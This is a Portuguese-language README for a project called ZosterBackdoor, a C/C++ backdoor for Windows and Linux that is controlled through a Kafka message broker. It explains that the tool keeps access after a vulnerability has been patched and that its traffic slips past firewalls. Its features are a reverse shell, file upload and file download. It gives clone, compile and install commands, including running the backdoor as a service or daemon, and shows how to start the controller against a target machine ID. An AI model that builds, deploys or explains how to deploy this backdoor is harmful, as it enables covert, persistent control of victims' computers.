# ZosterBackdoor

Zoster é uma Backdoor desenvolvida em C/C++ que permite uma conexão estável utilizando do sistema de mensageria Kafka.

### O que é uma Backdoor? <br>
  É um termo utilizado pelos hackers, se refere a um software que mantenha uma conexão a máquina, comumente utilizado após a exploração de alguma vulnerabilidade que permita instalá-la. Essa conexão serve para caso a vulnerabilidade pelo qual o hacker conseguiu acesso ao sistema (porta principal) seja corrigida, permitindo-o de manter uma conexão com a máquina (porta dos fundos). 

### Zoster <br>
  Zoster foi planejado para garantir uma conexão estável entre o controlador e a maquina alvo, utilizando um broker Kafka, que é um serviço intermediário que ira gerenciar as trocas de informação entre o controlador e a máquina que é controlada, garantindo assim maior estabilidade e uma vantagem de não precisar liberar portas em firewall, a conexão passa despercebida pelos firewalls tanto na parte do controlador quanto na máquina infectada pela Backdoor.
<br> <br>
  Zoster foi planejado para garantir uma conexão estável entre o controlador e a maquina alvo, utilizando um broker Kafka, que é um serviço intermediário que ira gerenciar as trocas de informação entre o controlador e a máquina que é controlada, garantindo assim maior estabilidade e uma vantagem de não precisar liberar portas em firewall, a conexão passa despercebida pelos firewalls tanto na parte do controlador quanto na máquina infectada pela Backdoor. <br>
  
  Zoster conta com um controlador que é a ferramenta que e comunica diretamente com as Backdoors.<br> Atualmente foi implementado neste controlador as seguintes funções:
 * Shell reverso, possibilitando executar comandos ou scripts no terminal.
 * Envio de arquivos.
 * Download de arquivos.
 
##### Zoster foi desenvolvido e testado nas plataformas Windows e Linux. 

### Requisitos:  <br>

- [x] Ter um service Broker kafka local ou na internet. 
- [x] cmake && make, para compilar (linux)
- [x] Visual Studio 2016 ou superior, para compilar (windows)

### Como usar:  <br>
#### 1. Instale o Kafka<br>
Para instalar o sistema de mensageria kafka voce pode seguir tutoriais faceis como estes:
[Instalar kafka no Ubutu 18.04](https://www.digitalocean.com/community/tutorials/how-to-install-apache-kafka-on-ubuntu-18-04)<br>
Ou simplesmente suba um docker: [Docker facil do kafka](https://github.com/lensesio/fast-data-dev) <br>
##### ex do docker: 
Instale o docker e execute: <br>
>docker run --rm -p 2181:2181 -p 3030:3030 -p 8081-8083:8081-8083  -p 9581-9585:9581-9585 -p 9092:9092 -e ADV_HOST=192.168.99.100  lensesio/fast-data-dev:latest

#### 2. Escolha sua plataforma e instale:<br>
* **Windows:** <br> 
Instale o visual Studio, recomendo usar a ultima versão. Instale todos os adicionais de c/c++ no momento da instalação. **Porem não instale nenhuma variavel local do cmake ou ninja. Caso esteja essas variaveis locais no windows as remova para não ter conflito com o script de compilação.** <br> clone o projeto https://github.com/rafaelharzer/ZosterBackdoor, então dentro do diretorio ZosterBackdoor abra um terminal e execute o script facil com:
> powershell .\script_facil.ps1

* **Linux:** <br> 
Instale o cmake e o make para compilar, porem ao executar o script facil como root ele automaticamente irá instalar essas ferramentas.
<br> abra um terminal e execute as instruções:
> git clone https://github.com/rafaelharzer/ZosterBackdoor <br>
> cd ZosterBackdoor <br>
> chmod +x script_facil.sh <br>
> ./script_facil.sh <br>

#### para mais informações sobre a compilação acesse o arquivo Ajuda-COMPILAR.txt

### Como Funcona:  <br>
A Backdoor pode ser compilada para linux e windows, funcionando como um serviço no windows e um daemon no linux. <br>
para executar a backdoor no windows basta em um terminal executar ela assando o parametro install ex:
> backdoor.exe install 

No linux basta executar a backdor que ja subira o daemon. ex:
> ./backdoor

Para poder controlar a backdoor existe o controlador, é a ferramenta de comunicação que deve ser compilada de acordo com seu sistema.
Para poder executar o controlador siga o ex:<br>
no linux:
> ./controlador localhost:9092 maquina_01

no windows:
> controlador.exe localhost:9092 maquina_01

O primeiro argumento são as informações para conectar no servidor broker kafka, a porta padrão é 9092. O segundo parametro é o ID da maquina configurado na hora da compilação usando o script facil, esse ID é o que identifica a maquina pelo qual você deseja se conectar. 
